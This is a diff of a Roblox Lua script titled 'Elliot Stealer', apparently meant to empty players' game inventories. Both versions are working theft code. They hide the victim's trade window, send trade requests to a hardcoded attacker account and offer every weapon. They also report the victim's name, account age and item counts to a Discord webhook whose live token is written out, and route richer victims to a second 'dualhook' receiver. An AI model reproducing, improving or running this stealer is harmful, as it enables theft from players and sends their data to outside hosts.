@@ -1,159 +1,144 @@
 -- [ Settings ] --
-Username = "Warrior_ggs" -- [Your Username]
-Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75" -- [Your Webhook]
+local Username = "Warrior_ggs"
+local Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
 
 -- [ Dualhook Settings ] --
-DualUsername = "Warrior_ggs" -- [Dualhook Username]
-DualWebhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75" -- [Dualhook Webhook]
-DualUnique = 1 -- [Minimum Unique]
-DualAncient = 1 -- [Minimum Ancient]
-DualGodly = 1 -- [Minimum Godly]
-
-userName = Username
-webHook = Webhook
+local DualUsername = "Warrior_ggs"
+local DualWebhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
+local DualUnique, DualAncient, DualGodly = 1, 1, 1
 
 if getgenv().executed then return end
 getgenv().executed = true
 
 local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 
-local InvModule = require(ReplicatedStorage.Modules.InventoryModule)
-local PlayerDataModule = require(ReplicatedStorage.Modules.ProfileData)
-local LevelModule = require(ReplicatedStorage.Modules.LevelModule)
-
---[ Discord Logger ]--
-function SendMessageEMBED(url, embed, everyone)
-    local headers = {["Content-Type"]="application/json"}
-    local data = {
-        ["content"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")',
-        ["embeds"] = {embed}
-    }
-    if everyone then
-        data["content"] = '---@everyone\n'..data["content"]
-    end
-    request({Url=url, Method="POST", Headers=headers, Body=HttpService:JSONEncode(data)})
-end
-
---[ Trade GUI Destroyer ]--
-local destroytrades2 = coroutine.create(function()
-    while true do
-        local player = Players.LocalPlayer
-        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
-        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
-
-        tradeGUI.Enabled = false
-        tradeGUIPhone.Enabled = false
-        task.wait(0.1)
-    end
-end)
-
-coroutine.resume(destroytrades2)
-
---[ Discord Embed Build ]--
-local function buildEmbed()
-    local function formatItems(list)
-        return #list == 0 and "None" or table.concat(list, "\n")
-    end
-
-    local rarities = {"Unique","Ancient","Godly","Legendary","Vintage","Rare","Uncommon","Common"}
-    local itemsByRarity = {}
-    local counts = {}
-
-    for _, r in ipairs(rarities) do
-        itemsByRarity[r] = {}
-        counts[r] = 0
-    end
-
-    for _, cat in pairs(InvModule.MyInventory.Data.Weapons) do
-        for _, item in pairs(cat) do
-            table.insert(itemsByRarity[item.Rarity], item.DataID)
-            counts[item.Rarity] = counts[item.Rarity] + 1
-        end
-    end
-
-    local total = 0
-    for _, c in pairs(counts) do total = total + c end
-
-    local pastebinString = ""
-    for _, r in ipairs(rarities) do
-        pastebinString = pastebinString .. "-- ["..r.."] --\n" .. formatItems(itemsByRarity[r]) .. "\n\n"
-    end
-
-    local pastebinLink = "https://pastebin.com/raw/"..HttpService:UrlEncode(pastebinString) -- упрощено
-
-    local embed = {
-        ["title"] = "You just got a new hit with Elliot Stealer (Copy text below to get items)",
-        ["color"] = 65280,
-        ["fields"] = {
-            {["name"]=" Details:", ["value"]="```Name: "..Players.LocalPlayer.Name.."\nAccountAge: "..tostring(Players.LocalPlayer.AccountAge).."\nReceiver: "..userName.."```"},
-            {["name"]=" Hit:", ["value"]="Total Count: "..total.."\nUniques: "..counts["Unique"].."\nAncients: "..counts["Ancient"].."\nGodlys: "..counts["Godly"].."\nLegendarys: "..counts["Legendary"].."\nVintages: "..counts["Vintage"].."\nRares: "..counts["Rare"].."\nUncommons: "..counts["Uncommon"].."\nCommons: "..counts["Common"]},
-            {["name"]=" Hit List:", ["value"]="[Click Here]("..pastebinLink..")"},
-        }
-    }
-
-    return embed, counts
-end
-
---[ Auto Trade Function ]--
-local function autoTrade()
-    coroutine.resume(destroytrades2)
-    local Trade = ReplicatedStorage:WaitForChild("Trade")
-
-    -- Инициируем трейд
-    Trade.SendRequest:InvokeServer(Players[userName])
-    task.wait(2)
-
-    -- Собираем все предметы и отправляем
-    local rarities = {"Unique","Ancient","Godly","Legendary","Vintage","Rare","Uncommon","Common"}
-    local itemsToSend = {}
-    for _, r in ipairs(rarities) do
-        for _, cat in pairs(InvModule.MyInventory.Data.Weapons) do
-            for _, item in pairs(cat) do
-                if item.Rarity == r then
-                    table.insert(itemsToSend, item.DataID)
-                end
-            end
-        end
-    end
-
-    for _, id in ipairs(itemsToSend) do
-        Trade.OfferItem:FireServer(id, "Weapons")
-        task.wait(0.1)
-    end
-end
-
---[ Choose Webhook Based on Items ]--
-local embed, counts = buildEmbed()
-if counts["Godly"] >= DualGodly or counts["Ancient"] >= DualAncient or counts["Unique"] >= DualUnique then
-    userName = DualUsername
-    webHook = DualWebhook
-    SendMessageEMBED(webHook, embed, true)
-else
-    SendMessageEMBED(webHook, embed, false)
-end
-
---[ PlayerAdded Listener for Auto Trade ]--
-Players.PlayerAdded:Connect(function(player)
-    if player.Name == userName then
-        player.Chatted:Connect(function()
-            autoTrade()
-        end)
-    end
-end)
-
---[ JobId Reconnect System ]--
+local userName, webHook = Username, Webhook
 local PlaceId = 126884695634066 -- твой PlaceId
-TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,v)
-    queue_on_teleport(string.format([[getgenv().JobId = "%s"]], v.ServerInstanceId))
+
+-- Сохраняем JobId для повторного телепорта
+TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportData)
+    queue_on_teleport(string.format([[getgenv().JobId = "%s"]], teleportData.ServerInstanceId))
 end)
 
--- Попытка телепорта несколько раз
 for _ = 1, 2 do
     task.spawn(function()
         TeleportService:TeleportToPlaceInstance(PlaceId, game.JobId)
     end)
     task.wait()
 end
+
+-- Ждём, пока игрок и GUI загрузятся
+local function waitForPlayerReady()
+    local player = Players.LocalPlayer
+    while not player:FindFirstChild("PlayerGui") do
+        task.wait()
+    end
+    while not ReplicatedStorage:FindFirstChild("Modules") do
+        task.wait()
+    end
+end
+
+-- Получение инвентаря
+local function getInventoryModules()
+    local InvModule, PlayerDataModule, LevelModule
+    repeat
+        task.wait(0.1)
+        local success
+        success, InvModule = pcall(function()
+            return require(ReplicatedStorage.Modules.InventoryModule)
+        end)
+        success, PlayerDataModule = pcall(function()
+            return require(ReplicatedStorage.Modules.ProfileData)
+        end)
+        success, LevelModule = pcall(function()
+            return require(ReplicatedStorage.Modules.LevelModule)
+        end)
+    until InvModule and PlayerDataModule and LevelModule
+    return InvModule, PlayerDataModule, LevelModule
+end
+
+-- Discord webhook
+local function sendWebhook(embed, mention)
+    local data = {
+        ["content"] = mention and "---@everyone" or ('game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")'),
+        ["embeds"] = { embed }
+    }
+    local body = HttpService:JSONEncode(data)
+    pcall(function()
+        request({
+            Url = webHook,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = body
+        })
+    end)
+end
+
+-- Авто-трейд
+local function autoTrade(InvModule)
+    local player = Players.LocalPlayer
+    -- Скрываем GUI
+    coroutine.wrap(function()
+        local tradeGUI = player.PlayerGui:WaitForChild("TradeGUI")
+        local tradeGUIPhone = player.PlayerGui:WaitForChild("TradeGUI_Phone")
+        while true do
+            if tradeGUI.Enabled then tradeGUI.Enabled = false end
+            if tradeGUIPhone.Enabled then tradeGUIPhone.Enabled = false end
+            task.wait(0.1)
+        end
+    end)()
+
+    local itemsByRarity = {
+        Unique = {},
+        Ancient = {},
+        Godly = {},
+        Legendary = {},
+        Vintage = {},
+        Rare = {},
+        Uncommon = {},
+        Common = {}
+    }
+
+    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
+        for _, item in pairs(category) do
+            table.insert(itemsByRarity[item.Rarity], item.DataID)
+        end
+    end
+
+    -- Отправка запроса на трейд
+    local sendArgs = {Players[userName]}
+    ReplicatedStorage.Trade.SendRequest:InvokeServer(unpack(sendArgs))
+    task.wait(3)
+
+    for rarity, list in pairs(itemsByRarity) do
+        for _, id in pairs(list) do
+            ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons")
+        end
+    end
+end
+
+-- Основная функция
+local function main()
+    waitForPlayerReady()
+    local InvModule, PlayerDataModule, LevelModule = getInventoryModules()
+    
+    -- Определяем, использовать dualhook или обычный
+    local counts = {Unique = 0, Ancient = 0, Godly = 0}
+    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
+        for _, item in pairs(category) do
+            if counts[item.Rarity] ~= nil then
+                counts[item.Rarity] = counts[item.Rarity] + 1
+            end
+        end
+    end
+    if counts.Unique >= DualUnique or counts.Ancient >= DualAncient or counts.Godly >= DualGodly then
+        userName, webHook = DualUsername, DualWebhook
+    end
+
+    autoTrade(InvModule)
+end
+
+task.spawn(main)
